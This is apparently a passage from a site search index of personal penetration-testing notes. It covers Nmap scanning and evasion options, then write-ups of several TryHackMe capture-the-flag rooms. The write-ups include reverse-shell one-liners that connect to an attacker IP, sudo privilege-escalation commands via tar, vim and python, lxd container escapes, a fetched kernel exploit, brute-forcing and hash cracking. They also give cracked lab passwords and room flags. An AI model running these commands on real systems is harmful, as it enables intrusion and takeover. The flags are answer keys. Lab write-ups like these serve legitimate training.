-&gt;&gt;&gt; sT</p> </li> <li> <p>udp scan -&gt;&gt;&gt;&gt; sU</p> </li> <li> <p>null scan -&gt;&gt;&gt; sN</p> </li> <li> <p>fin scan ----&gt;&gt;&gt; sF</p> </li> <li> <p>xmas scan -----&gt;&gt;&gt; sX</p> </li> <li> <p>tcp ack scan -----&gt;&gt;&gt; sA</p> </li> <li> <p>tcp\u00a0 window scan ----&gt;&gt;&gt;sW</p> </li> </ol>"},{"location":"notes/tools/Nmap/#tcp-custom-scan","title":"TCP CUSTOM SCAN","text":""},{"location":"notes/tools/Nmap/#custom-scan","title":"Custom Scan","text":"<p>If you want to experiment with a new TCP flag combination beyond the built-in TCP scan types, you can do so using\u00a0<code>--scanflags</code>. For instance, if you want to set SYN, RST, and FIN simultaneously, you can do so using\u00a0<code>--scanflags RSTSYNFIN</code>. As shown in the figure below, if you develop your custom scan, you need to know how the different ports will behave to interpret the results in different scenarios correctly.</p> <p>spoofing and decoying</p> <p>to spoof the ip address</p> <p>1.nmap -S spoofing _ip\u00a0 destination ip address</p> <p>2 to make the destination unable to find the attacker ip address decoying ip address is used just to make it seem like it's not comign from the attacker</p> <p>decoying method</p> <p> </p> <p></p> <p>fragmented packets</p> <p>-f\u00a0 switch in nmap indicates that the tcp header is fragmented by 8 -ff indicates fragmented by 16</p> <p>and so on</p> <p>idle zombie scan</p> <p>Spoofing the source IP address can be a great approach to scanning stealthily. However, spoofing will only work in specific network setups. It requires you to be in a position where you can monitor the traffic. Considering these limitations, spoofing your IP address can have little use; however, we can give it an upgrade with the idle scan.</p> <p>The idle scan, or zombie scan, requires an idle system connected to the network that you can communicate with. Practically, Nmap will make each probe appear as if coming from the idle (zombie) host, then it will check for indicators whether the idle (zombie) host received any response to the spoofed probe. This is accomplished by checking the IP identification (IP ID) value in the IP header. You can run an idle scan using\u00a0<code>nmap -sI ZOMBIE_IP</code> 10.10.141.192, where\u00a0<code>ZOMBIE_IP</code>\u00a0is the IP address of the idle host (zombie).</p> <p>about --reason flag</p> <p>Providing the\u00a0<code>--reason</code>\u00a0flag gives us the explicit reason why Nmap concluded that the system is up or a particular port is open. In this console output above, we can see that this system is considered online because Nmap \u201creceived arp-response.\u201d On the other hand, we know that the SSH port is deemed to be open because Nmap received a \u201csyn-ack\u201d packet back.</p> <p>If\u00a0<code>-vv</code>\u00a0does not satisfy your curiosity, you can use\u00a0<code>-d</code>\u00a0for debugging details or\u00a0<code>-dd</code>\u00a0for even more details. You can guarantee that using\u00a0<code>-d</code>\u00a0will create an output that extends beyond a single screen.</p> <p>vvvvvviiii scanning</p> <p></p> <p></p>"},{"location":"notes/tools/Nmap/#_nmap-post-port-scans","title":"_NMAP POST PORT SCANS","text":"<p>Once Nmap discovers open ports, you can probe the available port to detect the running service. Further investigation of open ports is an essential piece of information as the pentester can use it to learn if there are any known vulnerabilities of the service. Join\u00a0Vulnerabilities 101\u00a0to learn more about searching for vulnerable services.</p> <p>nmap scripting engine (nse)</p> <p></p> <p>You can also specify the script by name using\u00a0<code>--script \"SCRIPT-NAME\"</code>\u00a0or a pattern such as\u00a0<code>--script \"ftp*\"</code>, which would include\u00a0<code>ftp-brute</code>. If you are unsure what a script does, you can open the script file with a text reader, such as\u00a0<code>less</code>, or a text editor. In the case of\u00a0<code>ftp-brute</code>, it states: \u201cPerforms brute force password auditing against\u00a0FTP\u00a0servers.\u201d You have to be careful as some scripts are pretty intrusive. Moreover, some scripts might be for a specific server and, if chosen at random, will waste your time with no benefit. As usual, make sure that you are authorized to launch such tests on the target server.</p> <p>Let\u2019s consider a benign script,\u00a0<code>http-date</code>, which we guess would retrieve the http server date and time, and this is indeed confirmed in its description: \u201cGets the date from HTTP-like services. Also, it prints how much the date differs from local time\u2026\u201d On the AttackBox, we execute<code>sudo nmap -sS -n --script \"http-date\"</code> 10.10.124.135\u00a0as shown in the console below.</p>"},{"location":"notes/tools/Nmap/#protocols-and-servers","title":"PROTOCOLS AND SERVERS","text":"<p>a bit about telnet from google</p> <p>What do you mean by telnet?</p> <p>Telnet is\u00a0a network protocol used to virtually access a computer and to provide a two-way, collaborative and text-based communication channel between two machines. It follows a user command Transmission Control Protocol/Internet Protocol (TCP/IP) networking protocol for creating remote sessions.</p> <p>HTTP(80)</p> <p>HTTP\u00a0sends and receives data as cleartext (not encrypted); therefore, you can use a simple tool, such as Telnet (or Netcat), to communicate with a web server and act as a \u201cweb browser\u201d. The key difference is that you need to input the HTTP-related commands instead of the web browser doing that for you.</p> <p>In the following example, we will see how we can request a page from a web server; moreover, we will discover the webserver version. To accomplish this, we will use the Telnet client. We chose it because Telnet is a simple protocol; furthermore, it uses cleartext for communication. We will use\u00a0<code>telnet</code>\u00a0instead of a web browser to request a file from the webserver. The steps will be as follows:</p> <ol> <li> <p>First, we connect to port 80 using\u00a0<code>telnet</code> 10.10.58.4 <code>80</code>.</p> </li> <li> <p>Next, we need to type\u00a0<code>GET /index.html HTTP/1.1</code>\u00a0to retrieve the page\u00a0<code>index.html</code>\u00a0or\u00a0<code>GET / HTTP/1.1</code>\u00a0to retrieve the default page.</p> </li> <li> <p>Finally, you need to provide some value for the host like\u00a0<code>host: telnet</code>\u00a0and hit the Enter/Return key twice.</p> </li> </ol> <p>In the console output below, we could recover the requested page along with a trove of information not usually displayed by the web browser. If the page we requested is not found, we get error 404.</p> <p>FTP\u00a0 (21)</p> <p>File Transfer Protocol (FTP) was developed to make the transfer of files between different computers with different systems efficient.</p> <p>FTP\u00a0also sends and receives data as cleartext; therefore, we can use Telnet (or Netcat) to communicate with an FTP server and act as an FTP client. In the example below, we carried out the following steps:</p> <p>to connect :::</p> <p>ftp machine_ip</p> <p>telnet machine_ip 21.\u00a0 \u00a0 however unable to download file using this command</p> <p>pop3(110)</p> <p>to connect :::</p> <p>telnet ip_address 110 (for pop3)</p> <p>The example below shows what a POP3 session would look like if conducted via a Telnet client. First, the user connects to the POP3 server at the POP3 default port 110. Authentication is required to access the email messages; the user authenticates by providing his username\u00a0<code>USER frank</code>\u00a0and password\u00a0<code>PASS D2xc9CgD</code>. Using the command\u00a0<code>STAT</code>, we get the reply\u00a0<code>+OK 1 179</code>; based on\u00a0RFC 1939, a positive response to\u00a0<code>STAT</code>\u00a0has the format\u00a0<code>+OK nn mm</code>, where\u00a0nn\u00a0is the number of email messages in the inbox, and\u00a0mm\u00a0is the size of the inbox in octets (byte). The command\u00a0<code>LIST</code>\u00a0provided a list of new messages on the server, and\u00a0<code>RETR 1</code>\u00a0retrieved the first message in the list. We don\u2019t need to concern ourselves with memorizing these commands; however, it is helpful to strengthen our understanding of such protocol.</p> <p>IMAP (143)</p> <p>Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). In other words, if you mark an email message as read when checking your email on your smartphone, the change will be saved on the IMAP server (MDA) and replicated on your laptop when you synchronize your inbox.</p> <p>Let\u2019s take a look at sample IMAP commands. In the console output below, we use Telnet to connect to the IMAP server\u2019s default port, and then we authenticate using\u00a0<code>LOGIN username password</code>. IMAP requires each command to be preceded by a random string to be able to track the reply. So we added\u00a0<code>c1</code>, then\u00a0<code>c2</code>, and so on. Then we listed our mail folders using\u00a0<code>LIST \"\" \"*\"</code>, before checking if we have any new messages in the inbox using\u00a0<code>EXAMINE INBOX</code>. We don\u2019t need to memorize these commands; however, we are simply providing the example below to give a vivid image of what happens when the mail client communicates with an IMAP server.</p> <p>TO CONNECT:::</p> <p>telnet\u00a0 machine_ip 143</p>"},{"location":"notes/tools/Nmap/#protocols-and-servers-2","title":"PROTOCOLS AND SERVERS 2","text":"<p>The\u00a0Protocols and Servers\u00a0room covered many protocols:</p> <ul> <li> <p>Telnet</p> </li> <li> <p>HTTP</p> </li> <li> <p>FTP</p> </li> <li> <p>SMTP</p> </li> <li> <p>POP3</p> </li> <li> <p>IMAP</p> </li> </ul> <p>Servers implementing these protocols are subject to different kinds of attacks. To name a few, consider:</p> <ol> <li> <p>Sniffing Attack (Network Packet Capture)</p> </li> <li> <p>Man-in-the-Middle (MITM) Attack</p> </li> <li> <p>Password Attack (Authentication Attack)</p> </li> <li> <p>Vulnerabilities</p> </li> </ol> <p>Any time you browse over HTTP, you are susceptible to a MITM attack, and the scary thing is that you cannot recognize it. Many tools would aid you in carrying out such an attack, such as\u00a0Ettercap\u00a0and\u00a0Bettercap.</p> <p>ettercap (Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.)</p> <p>bettercap ( The Swiss Army knife for\u00a0WiFi,\u00a0Bluetooth Low Energy, wireless\u00a0HID hijacking\u00a0and\u00a0IPv4 and IPv6\u00a0networks reconnaissance and MITM attacks.</p> <p>Read the\u00a0project introduction\u00a0to get an idea of what bettercap can do for you,\u00a0install\u00a0it,\u00a0RTFM\u00a0and start\u00a0hacking all the things!!!</p>"},{"location":"notes/tools/Nmap/#how-to-find-nmap-scripts","title":"HOW TO FIND NMAP SCRIPTS:","text":"<p>Ok, so we know how to use the scripts in Nmap,but we don't yet know how to find these scripts.</p> <p>We have two options for this, which should ideally be used in conjunction with each other. The first is the page on the Nmap website\u00a0 (mentioned in the previous task) which contains a list of all official\u00a0 scripts. The second is the local storage on your attacking machine. Nmap\u00a0 stores its scripts on Linux at <code>/usr/share/nmap/scripts</code>. All of the NSE scripts are stored in this directory by default -- this is where Nmap looks for scripts when you specify them.</p> <p>There are two ways to search for installed scripts. One is by using the <code>/usr/share/nmap/scripts/script.db</code>\u00a0 file. Despite the extension, this isn't actually a database so much as a\u00a0 formatted text file containing filenames and categories for each\u00a0 available script.</p> <p></p> <p>Nmap uses this file to keep track of (and utilise) scripts for the scripting engine; however, we can also grep through it to look for scripts. For example: <code>grep \"ftp\" /usr/share/nmap/scripts/script.db</code>.</p> <p></p> <p>The second way to search for scripts is quite simply to use the <code>ls</code> command. For example, we could get the same results as in the previous screenshot by using <code>ls -l /usr/share/nmap/scripts/*ftp*</code>:</p> <p></p> <p>Note the use of asterisks (<code>*</code>) on either side of the search term</p> <p>The same techniques can also be used to search for categories of script. For example:<code>grep \"safe\" /usr/share/nmap/scripts/script.db</code></p> <p></p>"},{"location":"notes/tools/Nmap/#installing-new-scripts","title":"INSTALLING NEW SCRIPTS","text":"<p>We mentioned previously that the Nmap website contains a list of scripts, so, what happens if one of these is missing in the <code>scripts</code> directory locally? A standard <code>sudo apt update &amp;&amp; sudo apt install nmap</code> should fix this; however, it's also possible to install the scripts manually by downloading the script from Nmap (<code>sudo wget -O /usr/share/nmap/scripts/&lt;script-name&gt;.nse</code> https://svn.nmap.org/nmap/scripts/<code>&lt;script-name&gt;.nse</code>). This must then be followed up with <code>nmap --script-updatedb</code>, which updates the <code>script.db</code> file to contain the newly downloaded script.</p> <p>It's\u00a0 worth noting that you would require the same \"updatedb\" command if you\u00a0 were to make your own NSE script and add it into Nmap -- a more than\u00a0 manageable task with some basic knowledge of Lua!</p>"},{"location":"notes/tools/Nmap/#some-blue-text","title":"some blue text.","text":""},{"location":"tryhackme/Blog/","title":"Blog","text":""},{"location":"tryhackme/Blog/#emumeration","title":"emumeration:","text":"<p>user :BIlly Karen Wheeler ----&gt; mom </p> <p>https://wordpress.org/?v=5.0</p> <p>first running  <pre><code>smbclient -L ipaddress\n</code></pre></p> <p></p> <p> nothing valuable is found.just a rabbit hole</p> <p>let's try the wordpress enumeration:</p> <p>found the users: </p> <p>trying to bruteforce login credentials  </p> <p></p> <p>submitting the credential to wp-login.php</p> <p>we get file upload option on media however it only accepts image file jpg , png trying all the possibilities like revshell.jpg.php and even changing the magic bytes of the file .However no results was obtained </p> <p>since we have enumerated the version of the wordpress cms to 5.0 looking for the vulnerability we get tampered image file upload vulnerability and google and exploit-db continuously shows crop image rce  which is exploitable in meetasploit as well. so going for it :-</p> <p>we got the meterpreter shell :-</p> <p>catting the user.txt gives :-  using meterpreter i downloaded the firing letter of billy joel but couldnot get anything i tried exploit suggester.sh too but still couldnot find one however using linpeas.sh i found the checker with suid enabled</p> <p>finally: catting the wp-config.php we get  </p> <p>searching how to use mysql on commandline found this :- </p> <p>got the password hash: </p> <p>bjoel hash:   $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ kwheel hash:  $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te.</p> <p>which was just a rabbit hole since bjoel hash didnot crack however kwheel hash password came out to be cutiepie1 as before</p> <p>now i ran the linpeas and found the /usr/sbin/checker executing it gave following result: not an admin i did everything to exploit but couldnot so i eventually took help from walkthrough and found the on using ltrace command the admin is set from environment </p> <p>changing the admin by export admin=randomname and running the /usr/sbin/checker gave the root shell</p>"},{"location":"tryhackme/Gaming%20Server%20CTF/","title":"Gaming Server CTF","text":"<ul> <li>Running Nmap <pre><code>nmap -p- --min-rate=1000 10.10.165.228\n</code></pre></li> </ul> <p>-&gt; all ports are filtered -&gt; for more detailed NMAP scan:</p> <pre><code>nmap -sC -sV 10.10.165.228 -p22,80 -o nmap\n</code></pre> <p></p> <p>-&gt; fuzzing directories through FFUF </p> <pre><code>ffuf -u http://10.10.165.228/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt\n</code></pre> <p></p> <p>-&gt; searching directories through gobuster</p> <pre><code>gobuster dir -u http://10.10.165.228 -u /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n</code></pre> <p></p> <ul> <li>looking at the side's page source we find the username john :</li> <li>as shown by the gobuster moving to the directory /secret give the ssh private key however login is not successful since it contains passphrase</li> <li>trying to bruteforce the ssh private key</li> <li>i googled a bit and found this tutorial on how to crack ssh private key</li> <li>first i downloaded the ssh2john and converted the private key to hash</li> </ul> <pre><code>wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/ssh2john.py\n</code></pre> <pre><code>ssh2john rsaprivkey &gt;rsaprivkey.hash\n</code></pre> <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt rsaprivkey.hash\n</code></pre> <p>gives me the password: letmein</p> <p>now sshing to the shell</p> <pre><code>ssh -i priv_key john@10.10.165.228\n</code></pre> <p>passphrase:letmein</p> <p>cat user.txt returns a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e</p> <p>running id shows user running lxd which lets escalate our privilege I don't know much about lxd  so I took help of google and got this awesome  page lxd_privesc and lxd-another-technique</p> <p>the sequence of commands that i ran with the help of website are:</p> <pre><code>lxd init\n</code></pre> <pre><code>lsb_release -a\n</code></pre> <pre><code>lxc init ubuntu:18.04 test -c security.privileged=true\n</code></pre> <pre><code>lxc config device add test whatever disk source=/ path=/mnt/root recursive=true\n</code></pre> <pre><code>lxc start test\n</code></pre> <pre><code>lxc info test\n</code></pre> <pre><code>lxc exec test bash\n</code></pre> <pre><code>cd /mnt/root\n</code></pre> <p>which gives me rootflag.txt ---&gt; 2e337b8c9f3aff0c2b3e8d4e6a7c88fc</p>"},{"location":"tryhackme/IDE/","title":"IDE","text":"<p>It is an easy rated machine on tryhackme.</p> <p>NMAP port scan:</p> <p></p> <p></p> <p>it shows anonymous ftp login allowed and ssh enable now running gobuster on port 80</p> <p>gobuster doesnot show any result however the server is running on the port 62337 as well now gobustering on this port now checking the site on the browser gives a codiac 2.8.4 and a quick search on exploit-db gives that it has rce vulnerability however it requires the username and password.</p> <p></p> <p>we are prompted to enter username and password on the website now trying the ftp since anonymous login is enabled cd ... give a - file getting the file and catting it gives the result: </p> <p>now running the name john and default cred password we have sucessfully logged int now trying the found out exploit:</p> <p>exploitation:</p> <p></p> <p></p> <p>john password sha1:55c3b5386c486feb662a0785f340938f518d547f</p> <p>cracked password:5f4dcc3b5aa765d61d8327deb882cf99 however it was just a rabbit hole</p> <p>found the password of drac on .bash_history file on drac directory: mysql -u drac -p 'Th3dRaCULa1sR3aL'</p> <p>su drac and entering the password we get to cat the file which gives the user.txt</p> <p>02930d21a8eb009f6d26361b2d24a466</p> <p>running the sudo -l comamnd shows </p> <p>i located the vsftpd .service  file and changed the exec command to execute since it was writable by drac</p> <p>sudo /usr/chmod +s /bin/bash</p> <p>restarted the vsftpd and also systemctl daemon reload</p> <p>running the /bin/bash -p gives the root access</p> <p>which gives the root flag </p>"},{"location":"tryhackme/Overlayfs/","title":"Overlayfs","text":"<ul> <li> <p>SSHing to the machine  <pre><code>ssh overlay@10.10.26.144 \n</code></pre></p> </li> <li> <p>The exploit of the CVE-2021-3493 is available on this website</p> </li> <li>on our host machine from the directory where exploit.c is contained </li> </ul> <pre><code>python3 -m http.server\n</code></pre> <ul> <li>on the SSHed machine CDing to the /tmp which is writable</li> </ul> <pre><code> wget http://ip:8000/exploit.c\n</code></pre> <pre><code>chmod +rwx exploit.c\n</code></pre> <pre><code>gcc -o exploit exploit.c\n</code></pre> <ul> <li>./exploit.c gives the rootshell </li> <li>cat /root/flag.txt ---&gt; thm{27aaa5865a52dcd4cb04c0e0a2d39404}</li> </ul>"},{"location":"tryhackme/Root%20me/","title":"Root me","text":"<p>/panel file found from gobuster </p> <p>file upload vulnerability is found  uploading the php reverse shell however php not allowed so i changed the file name to php-reverse-shell.txt.php  which is also not allowed however  php-reverse-shell.phtml is allowed to upload and setting up the netcat listener i got the shell on my machine </p> <p>PRIVILEGE ESCALATION: sudo -l and sudo bash asks for password running find / -type f -perm -04000 2&gt;/dev/null gives unusual python with suid bit set again digging on teh gtfobins gives result :</p> <pre><code>python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\n</code></pre> <p>which gave us root shell and the rootflag</p>"},{"location":"tryhackme/bountyhacker/","title":"Bountyhacker","text":"<p><code>nmap -Pn -p- --min-rate=10000 10.10.78.125</code></p> <p>-Pn to disable ping probes</p> <p>PORT   STATE SERVICE 21/tcp open  ftp 22/tcp open  ssh 80/tcp open  http</p> <p>nmap detailed scan: </p> <p>now running hydra :-</p> <pre><code> hydra -L user.txt  -P locks.txt 10.10.35.129 -t 4 ssh\n</code></pre> <p>[22][ssh] host: 10.10.35.129   login: lin   password: RedDr4gonSynd1cat3</p> <p>logging in with the found credentials</p> <p>gives off user.txt ----&gt; THM{CR1M3_SyNd1C4T3}</p> <pre><code>sudo -l\n</code></pre> <p>lin can run tar as root in the system </p> <p>quick digging on gtfobins gives the result <pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh\n</code></pre></p> <p>which give root access and cat root.txt gives  THM{80UN7Y_h4cK3r}</p>"},{"location":"tryhackme/lazyadmin/","title":"Lazyadmin","text":"<p>\\\"admin\\\";s:7:\\\"manager\\\";s:6:\\\"passwd\\\";s:32:\\\" again from some digging got this  page  http://10.10.51.131/content/as/ </p> <p>https://www.sweetrice.xyz/docs/5-things-need-to-be-done-when-SweetRice-installed/ got this </p> <p>http://10.10.51.131/content/inc/. got the list of directories from it </p> <p>cracking the hash we got from the backup file  Password123</p> <p>logging in with cred manager and password: Password123</p> <p>we see a wordpress like file  and file upload option there we uploaded our reverseshell.php5 since php is not allowed</p>"},{"location":"tryhackme/lazyadmin/#privilege-escalaition","title":"privilege escalaition","text":"<p>sudo -l gives /home/itguy/backup.pl file it shows that backup.pl runs /etc/test.sh  now modifying the etc/test.sh to run reverse shell on our attacking machine. bash -i &gt;&amp; /dev/tcp/10.17.#.#/8080 0&gt;&amp;1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.17.56.56 3333 &gt;/tmp/f  which gives us our root bash running cat /root/root.txt gives us the rootflag</p>"},{"location":"tryhackme/overpass/","title":"Overpass","text":"<p>22/tcp open  ssh 80/tcp open  http</p> <p>Yeah right, just because the Romans used it doesn't make it military grade, change this?</p> <p>detail scan ----&gt; PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   2048 37968598d1009c1463d9b03475b1f957 (RSA) |   256 5375fac065daddb1e8dd40b8f6823924 (ECDSA) |_  256 1c4ada1f36546da6c61700272e67759c (ED25519) 80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Overpass Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p> <p>\u2500\u2500\u257c $ffuf -u http://10.10.146.167/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/big.txt</p> <pre><code>    /'___\\  /'___\\           /'___\\       \n   /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n   \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n    \\ \\ \\_/  \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n     \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n      \\/_/    \\/_/   \\/___/    \\/_/\n\n   v1.4.1-dev\n</code></pre> <p>:: Method           : GET  :: URL              : http://10.10.146.167/FUZZ  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt  :: Follow redirects : false  :: Calibration      : false  :: Timeout          : 10  :: Threads          : 40  :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</p> <p>admin                   [Status: 301, Size: 42, Words: 3, Lines: 3, Duration: 196ms] css                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 177ms] downloads               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 170ms] img                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 193ms]</p> <p>gobuster </p> <p>=============================================================== /img                  (Status: 301) [Size: 0] [--&gt; img/] /downloads            (Status: 301) [Size: 0] [--&gt; downloads/] /aboutus              (Status: 301) [Size: 0] [--&gt; aboutus/] /admin                (Status: 301) [Size: 42] [--&gt; /admin/] /css                  (Status: 301) [Size: 0] [--&gt; css/]     </p> <p>James from image file</p> <p>checking out the network on developer options i could see that credentials is validated through login.js which check the session cookie or data returned from api</p> <p>async function login() {     const usernameBox = document.querySelector(\"#username\");     const passwordBox = document.querySelector(\"#password\");     const loginStatus = document.querySelector(\"#loginStatus\");     loginStatus.textContent = \"\"     const creds = { username: usernameBox.value, password: passwordBox.value }     const response = await postData(\"/api/login\", creds)     const statusOrCookie = await response.text()     if (statusOrCookie === \"Incorrect credentials\") {         loginStatus.textContent = \"Incorrect Credentials\"         passwordBox.value=\"\"     } else {         Cookies.set(\"SessionToken\",statusOrCookie)         window.location = \"/admin\"     } }</p> <p>setting up the cookin in the network tab we get :</p> <p>Since you keep forgetting your password, James, I've set up SSH keys for you.</p> <p>If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you. Also, we really need to talk about this \"Military Grade\" encryption. - Paradox</p> <p>after setting the cookie  SessionToken to statusOrCookie we get the private ssh key</p> <p>cracking the ssh key using the ssh2john and john and using the wordlist rockyou.txt.</p> <p>which gives the password james13</p>"},{"location":"tryhackme/relevant/","title":"Relevant","text":"<p>releavant is medium rated ctf room on tryhackme. </p>"},{"location":"tryhackme/relevant/#enumeration","title":"enumeration:","text":""},{"location":"tryhackme/relevant/#nmap-scan","title":"nmap scan:","text":"<p> nmap detailed scan:</p> <p></p> <p></p> <p>which shows port 139,445 running the smb and  port 80 runing the microsoft IIs windows server</p> <pre><code>smbclient -L 10.10.103.69\n</code></pre> <p></p> <p>now running <pre><code>smbclient //10.10.103.69/nt4wrksv\n</code></pre></p> <p>which has passwords.txt file get passwords.txt</p> <p>which has base64 encoded passwords.txt - Qm9iIC0gIVBAJCRXMHJEITEyMw== - QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk</p> <p>which gives  - Bob - !P@\\(\\(W0rD!123 Bill - Juw4nnaM4n420696969!/\\)\\)</p> <p>smb version: 3.1.1</p> <p></p> <p>gobuster command  <pre><code>gobuster dir -u http://10.10.168.75:49663/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t 50 --no-error\n</code></pre></p>"},{"location":"tryhackme/simple%20ctf/","title":"Simple ctf","text":""},{"location":"tryhackme/simple%20ctf/#enumeration","title":"Enumeration:","text":"<p>nmap scan results: </p> <p>gobuster result: </p> <p>/simple implements cms 2.4.8 which is vulnerable to sql injection based attack  CVE-2019-2053  exploit link modifying the cve to run on python3 not just on python now running the exploit python3 -u http://10.10.172.2/simple  which starts bruteforcing  </p> <p>running ssh to user mitcuL at port 2222 did not let us log becaus eof the incorrect exploit i ran the correct exploit and got this  </p> <p>[+] Salt for password found: 1dac0d92e9fa6bb2 [+] Username found: mitch [+] Email found: admin@admin.com [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96 which gave me the password secret</p> <p>0c01f4468bd75d7a84c7eb73846e8d96 </p> <p><pre><code>/usr/bin/vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'\n</code></pre> again this command did'nt run <pre><code>sudo vim -c ':!/bin/sh'\n</code></pre>  this ran and gave me root access</p> <p>rootflag: W3ll d0n3. You made it!</p> <p></p>"}]}